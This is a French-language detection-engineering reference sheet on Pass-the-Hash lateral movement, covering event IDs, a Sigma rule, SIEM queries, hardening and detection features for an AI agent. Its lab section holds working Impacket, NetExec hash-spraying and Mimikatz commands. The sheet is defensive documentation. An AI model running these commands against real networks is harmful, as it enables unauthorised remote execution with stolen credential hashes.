# 13 — Pass-the-Hash (PtH)

| Champ | Valeur |
|-------|--------|
| **Tactique MITRE** | Lateral Movement |
| **Technique MITRE** | T1550.002 |
| **Phase kill chain** | Lateral Movement |
| **CVE** | — |
| **Privilèges requis** | Hash NTLM d'un compte (souvent admin local) |
| **Impact** | Élevé (mouvement latéral sans mot de passe en clair) |

---

## 1. Description

L'authentification NTLM ne vérifie pas le mot de passe en clair mais son **hash NTLM**. Un attaquant qui possède ce hash peut **s'authentifier directement** sans jamais connaître le mot de passe — c'est le Pass-the-Hash. Très efficace quand un même mot de passe d'**administrateur local** est réutilisé sur plusieurs machines (absence de LAPS).

## 2. Prérequis

- Hash NTLM d'un compte (extrait via LSASS dump, SAM, NTDS.dit).
- NTLM autorisé sur la cible.
- Compte disposant de droits sur la machine distante (souvent admin local).

## 3. Procédure de simulation (lab)

> ⚠️ Lab isolé uniquement.

**Outils :** Impacket (`psexec.py`, `wmiexec.py`), Mimikatz, CrackMapExec/NetExec.

```bash
# Impacket — exécution distante avec le hash
psexec.py -hashes :<NTLM_hash> DOMAINE.LOCAL/Administrator@10.0.0.20
wmiexec.py -hashes :<NTLM_hash> DOMAINE.LOCAL/Administrator@10.0.0.20

# NetExec — spray d'un hash sur un subnet
nxc smb 10.0.0.0/24 -u Administrator -H <NTLM_hash>
```

```powershell
# Mimikatz — Pass-the-Hash local
sekurlsa::pth /user:Administrator /domain:domaine.local /ntlm:<hash> /run:cmd.exe
```

**Résultat attendu :** shell / exécution de commandes sur la machine distante.

## 4. Télémétrie générée (logs)

### Event IDs clés
| Source | Event ID | Signification |
|--------|----------|---------------|
| Security (cible) | **4624** | Logon réussi — **Logon Type 3** (réseau), **Auth Package = NTLM** |
| Security (cible) | 4672 | Special privileges assigned (si admin) |
| Security (cible) | 4776 | Credential validation (NTLM) |
| Sysmon | 1 / 3 | Process creation / Network (psexec → services.exe, cmd) |

**Anomalies discriminantes :**
- Logon **NTLM (Type 3)** vers une ressource où l'on attendrait Kerberos (accès par IP plutôt que par nom → NTLM).
- `Logon Process = NtLmSsp`.
- Compte à privilèges se connectant depuis une **station de travail** vers une autre station (mouvement latéral).

## 5. Détection

### Logique de détection
Repérer les **logons NTLM Type 3** avec des comptes privilégiés, surtout station→station ou par IP, et les enchaînements rapides d'authentifications d'un même compte vers plusieurs hôtes.

### Règle Sigma
```yaml
title: Possible Pass-the-Hash - NTLM Network Logon with Privileged Account
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: 'NTLM'
    filter_anonymous:
        TargetUserName: 'ANONYMOUS LOGON'
    condition: selection and not filter_anonymous
level: medium
```

### Traduction SIEM
- **Elastic (KQL) :** `event.code:4624 and winlog.event_data.LogonType:"3" and winlog.event_data.AuthenticationPackageName:"NTLM"`
- **QRadar (AQL) :** corrélation d'un même `TargetUserName` NTLM Type 3 vers **N hôtes distincts** en < X minutes.

## 6. Contre-mesures / Hardening

- **LAPS** : mots de passe admin local uniques par machine.
- Désactiver/restreindre NTLM (forcer Kerberos).
- **Protected Users** group + Credential Guard (empêche le vol de hash en mémoire).
- Restreindre les logons distants des comptes privilégiés (Tiering).

## 7. Features pour l'agent IA

- Nombre d'hôtes distincts atteints par un compte via NTLM Type 3 / fenêtre (fan-out latéral).
- Ratio NTLM vs Kerberos par compte.
- Direction du logon (station→station = anormal).
- Nouveauté de la paire (compte, hôte cible) vs baseline.
- Authentification par IP vs FQDN.

## 8. Références

- https://attack.mitre.org/techniques/T1550/002/
- https://www.thehacker.recipes/ad/movement/ntlm/pass-the-hash
